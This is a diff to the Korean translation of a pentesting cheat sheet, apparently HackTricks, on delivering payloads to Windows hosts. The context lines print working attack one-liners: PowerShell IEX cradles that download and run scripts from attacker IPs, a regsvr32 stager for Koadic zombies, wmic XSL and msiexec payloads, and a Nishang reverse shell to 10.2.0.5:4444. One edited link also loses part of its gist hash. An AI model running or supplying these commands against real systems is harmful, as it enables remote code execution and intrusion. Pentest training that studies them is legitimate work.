@@ -94,7 +94,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 네트워크 호출을 수행하는 프로세스: **powershell.exe**\
-디스크에 기록된 페이로드: **아니오** (_적어도 procmon을 사용하여 찾을 수 있는 곳에서는 !_ )
+디스크에 기록된 페이로드: **아니오** (_적어도 procmon을 사용하여 찾을 수 있는 곳은 없습니다!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -264,7 +264,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**당신은 stager regsvr를 사용하여 Koadic 좀비를 매우 쉽게 다운로드하고 실행할 수 있습니다.**
+**stager regsvr를 사용하여 Koadic 좀비를 매우 쉽게 다운로드하고 실행할 수 있습니다.**
 
 ## Certutil
 
@@ -305,7 +305,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**탐지됨**
+**탐지됨 방어자에 의해**
 
 ## **MSIExec**
 
@@ -326,7 +326,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+예제 xsl 파일 [여기에서](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -391,7 +391,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-**Shells** 폴더에는 다양한 셸이 많이 있다. Invoke-_PowerShellTcp.ps1_를 다운로드하고 실행하려면 스크립트의 복사본을 만들고 파일 끝에 추가하십시오:
+**Shells** 폴더에는 다양한 셸이 많이 있다. Invoke-_PowerShellTcp.ps1_를 다운로드하고 실행하려면 스크립트를 복사하고 파일 끝에 추가하십시오:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -458,15 +458,15 @@ msfconsole -r unicorn.rc
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**악성 코드로 감지됨**
+**악성 코드로 탐지됨**
 
 ## 더 알아보기
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) 공격적인 PS 모듈이 미리 로드된 PS 콘솔 (암호화됨)\
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
+[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) 공격적인 PS 모듈과 프록시 탐지가 포함된 PS 콘솔 (IEX)
 
-## 참고자료
+## 참고 문헌
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
@@ -487,7 +487,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
